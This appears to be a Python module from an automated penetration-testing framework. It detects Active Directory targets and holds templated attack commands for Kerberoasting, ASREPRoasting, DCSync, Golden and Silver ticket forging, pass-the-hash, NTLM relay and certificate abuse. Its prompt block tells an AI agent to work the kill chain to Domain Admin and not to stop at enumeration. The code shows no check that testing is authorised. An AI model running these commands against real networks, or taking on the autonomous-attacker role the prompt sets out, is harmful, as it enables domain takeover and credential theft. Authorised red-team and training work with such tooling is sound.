"""
KMN-CyberSeek Active Directory Exploitation Module (Roadmap: KMN-Training-Win)

Target-agnostic Active Directory methodology. Provides:

  1. Environment detection — is this Windows target an AD domain member?
  2. AD enumeration playbook — LDAP, Kerberos, SMB/RPC, BloodHound, GPO.
  3. Curated attack knowledge base — Kerberoast, ASREPRoast, DCSync, Golden/Silver
     tickets, NTLM relay, pass-the-hash, and privilege escalation to Domain Admin.

Pure data + helpers — no I/O, no orchestrator coupling — so it is trivially
unit-testable and safe to import anywhere. The orchestrator surfaces the
enumeration steps through the coverage engine and the attacks through a prompt
context block, so the tactical LLM attempts known AD paths instead of improvising.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List

# ── AD environment detection ─────────────────────────────────────────────────
# Ports/services whose presence strongly implies a Windows/AD domain target.
AD_PORTS = {88, 389, 636, 3268, 3269, 445, 139, 135, 5985, 5986, 3389, 464, 53}
AD_SERVICE_NAMES = (
    "ldap", "kerberos", "kerberos-sec", "kpasswd", "globalcatldap", "gc",
    "msrpc", "netbios-ssn", "microsoft-ds", "winrm", "ms-wbt-server",
    "epmap", "rpcbind", "domain",
)


def detect_ad_environment(services: List[Dict]) -> Dict:
    """Return an AD detection verdict for a list of discovered-service dicts.

    Result:
      {"ad": bool, "domain": str, "dc": str, "confidence": 0.0-1.0, "signals": [...]}
    Domain/DC are best-effort (may be empty even when ad=True).
    """
    signals: List[str] = []
    ad_hits = 0
    total = 0
    domain_hints: List[str] = []
    for svc in services or []:
        name = str(svc.get("service") or "").lower()
        try:
            port = int(svc.get("port") or 0)
        except (TypeError, ValueError):
            port = 0
        if name in AD_SERVICE_NAMES or port in AD_PORTS:
            ad_hits += 1
            signals.append(f"{name or 'port'}:{port}" if port else name)
        total += 1
        # Domain hints from service/version/extra banners.
        blob = f"{name} {svc.get('version') or ''} {svc.get('product') or ''}".lower()
        m = __import__("re").search(r"(?:domain|dns|fqdn)[:= ]+([\w.\-]+)", blob)
        if m and "." in m.group(1):
            domain_hints.append(m.group(1))
        if svc.get("hostname"):
            domain_hints.append(str(svc["hostname"]))
    confidence = min(0.95, 0.35 * ad_hits + (0.15 if domain_hints else 0.0))
    return {
        "ad": ad_hits >= 1,
        "domain": (domain_hints[0] if domain_hints else ""),
        "dc": "",
        "confidence": round(confidence, 2),
        "signals": signals[:12],
    }


@dataclass
class ADStep:
    """One AD enumeration/attack step (coverage-engine compatible)."""
    id: str
    intent: str
    phase: str = "enumeration"   # enumeration | vulnerability_analysis | exploitation | post_exploitation
    command: str = ""            # template; {host} {domain} {dc} {user} {pass} substituted
    tool: str = ""
    produces: List[str] = field(default_factory=list)
    signals: List[str] = field(default_factory=list)

    def render(self, ctx: dict) -> str:
        host = ctx.get("host") or ctx.get("target") or ""
        domain = ctx.get("domain") or ctx.get("fqdn") or host
        dc = ctx.get("dc") or host
        user = ctx.get("user") or "Administrator"
        pwd = ctx.get("password") or "''"
        return self.command.format(host=host, domain=domain, dc=dc, user=user, pwd=pwd)

    def matches_command(self, command: str) -> bool:
        c = (command or "").lower()
        if self.tool and self.tool.lower() in c:
            return True
        return any(sig.lower() in c for sig in self.signals)


# ── AD enumeration playbook ───────────────────────────────────────────────────
AD_ENUM_STEPS: List[ADStep] = [
    ADStep("ad.ldap_enum", "Enumerate domain via LDAP (naming contexts, users)",
           "enumeration",
           "ldapsearch -x -H ldap://{dc} -b '' -s base namingcontexts 2>/dev/null",
           tool="ldapsearch", produces=["users", "domain"], signals=["ldapsearch"]),
    ADStep("ad.kerbrute_users", "Enumerate valid domain users via Kerberos pre-auth",
           "enumeration",
           "kerbrute userenum -d {domain} --dc {dc} /usr/share/seclists/Usernames/Names/names.txt 2>/dev/null",
           tool="kerbrute", produces=["users"], signals=["kerbrute", "userenum"]),
    ADStep("ad.impacket_users", "Enumerate domain users via Impacket (unauthenticated)",
           "enumeration",
           "impacket-GetADUsers -all -dc-ip {dc} {domain}/ 2>/dev/null",
           tool="impacket-GetADUsers", produces=["users"], signals=["getadusers"]),
    ADStep("ad.rpc_enum", "Enumerate users/groups/domains over SMB RPC (null session)",
           "enumeration",
           "nxc smb {dc} -u '' -p '' --users --groups --shares 2>/dev/null",
           tool="nxc", produces=["users", "groups"], signals=["--users", "--groups"]),
    ADStep("ad.smb_enum", "Full SMB/RPC domain enumeration",
           "enumeration",
           "enum4linux-ng -A {dc} 2>/dev/null",
           tool="enum4linux-ng", produces=["users", "groups", "shares"], signals=["enum4linux"]),
    ADStep("ad.asreproast", "ASREPRoast — extract crackable TGTs for users without pre-auth",
           "vulnerability_analysis",
           "impacket-GetNPUsers {domain}/ -dc-ip {dc} -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep_hashes.txt 2>/dev/null",
           tool="impacket-GetNPUsers", produces=["hash", "creds"], signals=["getnpusers", "asreproast"]),
    ADStep("ad.kerberoast", "Kerberoast — request SPN service tickets for cracking",
           "vulnerability_analysis",
           "impacket-GetUserSPNs {domain}/{user}:{pwd} -dc-ip {dc} -request -outputfile /tmp/kerberoast_hashes.txt 2>/dev/null",
           tool="impacket-GetUserSPNs", produces=["hash", "creds"], signals=["getuserspns", "kerberoast"]),
    ADStep("ad.bloodhound", "Collect AD graph data for BloodHound analysis",
           "enumeration",
           "bloodhound-python -u {user} -p {pwd} -ns {dc} -d {domain} -c All --zip 2>/dev/null",
           tool="bloodhound-python", produces=["domain", "acl"], signals=["bloodhound"]),
    ADStep("ad.gpo_enum", "Enumerate Group Policy Objects",
           "enumeration",
           "nxc smb {dc} -u {user} -p {pwd} --gpp-passwords 2>/dev/null",
           tool="nxc", produces=["creds", "misconfig"], signals=["gpp-passwords", "gpo"]),
    ADStep("ad.trusts", "Enumerate domain and forest trusts",
           "enumeration",
           "nxc ldap {dc} -u {user} -p {pwd} --trusted-for-delegation 2>/dev/null",
           tool="nxc", produces=["domain", "misconfig"], signals=["trust", "delegation"]),
]

# ── Curated AD attack knowledge base ─────────────────────────────────────────
AD_ATTACKS: List[Dict] = [
    {"name": "ASREPRoast (TGT without pre-auth)", "cve": "",
     "technique": "Accounts with 'Do not require Kerberos preauthentication' expose a "
                  "crackable TGT to any unauthenticated user. Crack with hashcat -m 18200.",
     "tool": "impacket-GetNPUsers -format hashcat | hashcat -m 18200"},
    {"name": "Kerberoast (SPN service tickets)", "cve": "",
     "technique": "Request SPN tickets for service accounts with weak passwords. Crack "
                  "with hashcat -m 13100. A cracked service account is often a domain-admin path.",
     "tool": "impacket-GetUserSPNs -request | hashcat -m 13100"},
    {"name": "DCSync (replicate secrets from DC)", "cve": "",
     "technique": "With Replicating-Directory-Changes rights (or Domain Admin), pull "
                  "NTLM hashes/kerberos keys for any principal, including krbtgt.",
     "tool": "impacket-secretsdump {domain}/{user}:{pwd}@{dc} -just-dc"},
    {"name": "Golden Ticket", "cve": "",
     "technique": "With krbtgt NTLM hash, forge a TGT granting Domain Admin for any user.",
     "tool": "impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain {domain} Administrator"},
    {"name": "Silver Ticket", "cve": "",
     "technique": "Forge a service ticket (e.g. CIFS/HTTP) using the target service "
                  "account hash for stealthy, scoped access to one service.",
     "tool": "impacket-ticketer -nthash <svc_hash> -spn cifs/{dc} -domain-sid <sid>"},
    {"name": "Pass-the-Hash", "cve": "",
     "technique": "Reuse a captured NTLM hash (no plaintext needed) to authenticate to "
                  "SMB/WinRM/RDP and execute or dump more hashes.",
     "tool": "nxc smb {dc} -u {user} -H <hash>; impacket-psexec -hashes :<hash>"},
    {"name": "NTLM relay / LLMNR poisoning", "cve": "",
     "technique": "If LLMNR/NBT-NS is enabled, poison name resolution with Responder and "
                  "relay captured Net-NTLMv2 hashes to a non-signing SMB host (ntlmrelayx).",
     "tool": "responder -I eth0; ntlmrelayx.py -tf targets.txt -smb2support"},
    {"name": "Unconstrained delegation abuse", "cve": "",
     "technique": "Compromise a host with unconstrained delegation to capture the TGT of "
                  "any principal that authenticates to it (e.g. a DC), then DCSync.",
     "tool": "nxc ldap {dc} -u {user} -p {pwd} --trusted-for-delegation"},
    {"name": "Constrained delegation abuse", "cve": "",
     "technique": "A service allowed to delegate to a target (e.g. CIFS/DC) can impersonate "
                  "any user to that target via S4U2self/S4U2proxy.",
     "tool": "impacket-getST -spn cifs/{dc} -impersonate Administrator"},
    {"name": "ADCS ESC1-ESC8 (certificate abuse)", "cve": "",
     "technique": "Misconfigured Active Directory Certificate Services templates permit "
                  "enrolling a certificate for any user (ESC1) → authentication as them.",
     "tool": "certipy find -u {user} -p {pwd} -dc-ip {dc} -vulnerable"},
    {"name": "Privilege escalation to DA", "cve": "",
     "technique": "Follow the kill chain: unpriv user → Kerberoast → service account → "
                  "DCSync/secretsdump krbtgt → Golden Ticket → Domain Admin.",
     "tool": "impacket-secretsdump -just-dc-ntlm; impacket-ticketer"},
]


def ad_context_block(ad: Dict, creds: List[Dict] = None) -> str:
    """Render an AD-focused guidance block for the AI prompt. Empty when ad=False."""
    if not ad or not ad.get("ad"):
        return ""
    dom = ad.get("domain") or "DOMAIN.local"
    dc = ad.get("dc") or "the DC"
    cred_line = ""
    if creds:
        cred_line = "\nYou HAVE domain credentials — use them in the commands above.\n"
    lines = [
        "\n=== ACTIVE DIRECTORY TARGET (KMN-Training-Win methodology) ===",
        f"Detected AD environment (confidence {ad.get('confidence', 0):.2f}): "
        f"signals {', '.join(ad.get('signals', [])[:6])}.",
        f"Assume domain '{dom}' and DC '{dc}' unless enumeration says otherwise.",
        "Work the AD kill chain in order:",
        "  1. Enumerate users (kerbrute / GetADUsers / RPC null-session).",
        "  2. ASREPRoast then Kerberoast; crack hashes offline (hashcat -m 18200/13100).",
        "  3. Reuse every cracked credential/hash (pass-the-hash) across SMB/WinRM/RDP.",
        "  4. BloodHound for ACL/delegation attack paths.",
        "  5. Escalate: unconstrained delegation → DCSync/secretsdump → Golden Ticket → DA.",
        cred_line,
        "Attempt the relevant KNOWN EXPLOIT CANDIDATES above; do not stop at "
        "enumeration. A confirmed DA / DCSync hash dump is the objective.\n",
    ]
    return "\n".join(lines)
